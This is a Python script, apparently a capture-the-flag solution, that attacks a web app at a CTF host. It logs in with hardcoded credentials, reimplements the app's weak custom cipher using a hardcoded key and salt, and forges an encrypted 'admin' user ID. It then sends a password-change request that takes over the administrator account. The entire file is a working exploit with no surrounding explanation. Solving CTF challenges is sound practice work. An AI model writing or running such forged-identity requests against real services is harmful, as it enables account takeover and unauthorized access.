import requests
import sys

KEY = "Th1s!sTh3K3y!"
SALT = "S4lt!sH3r3"

def encrypt(text):
    combined = KEY + SALT
    pos = 3
    result = []
    for i, ch in enumerate(text):
        cc = ord(ch)
        kc = ord(combined[i % len(combined)])
        encrypted = (cc + kc + (i * pos)) % 256
        result.append(f"{encrypted:02x}")
    return "".join(result)

def decrypt(hex_str):
    combined = KEY + SALT
    pos = 3
    result = []
    for i in range(0, len(hex_str), 2):
        encrypted = int(hex_str[i:i+2], 16)
        kc = ord(combined[(i // 2) % len(combined)])
        decrypted = (encrypted - kc - ((i // 2) * pos)) % 256
        result.append(chr(decrypted))
    return "".join(result)

def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "https://ctf1.mahirag.xyz"
    if base_url.endswith("/"):
        base_url = base_url[:-1]

    print(f"[*] Targeting: {base_url}")

    print("[*] Logging in as user:Best@fluck...")
    r = requests.post(f"{base_url}/api/login", json={
        "username": "user",
        "password": "Best@fluck"
    })
    data = r.json()
    enc_id = data["encrypted_user_id"]
    token = data["token"]
    print(f"[+] Token: {token}")
    print(f"[+] Encrypted User ID: {enc_id}")

    decrypted = decrypt(enc_id)
    print(f"[+] Decrypted User ID: {decrypted}")

    admin_enc = encrypt("admin")
    print(f"[+] Encrypted 'admin': {admin_enc}")

    print("[*] Sending forged password reset request...")
    r2 = requests.post(f"{base_url}/api/profile/change-password", json={
        "userid": admin_enc,
        "current_password": encrypt("anything"),
        "new_password": encrypt("anything")
    }, headers={"Authorization": f"Bearer {token}"})

    result = r2.json()
    print(f"\n[+] {result['message']}")

if __name__ == "__main__":
    main()
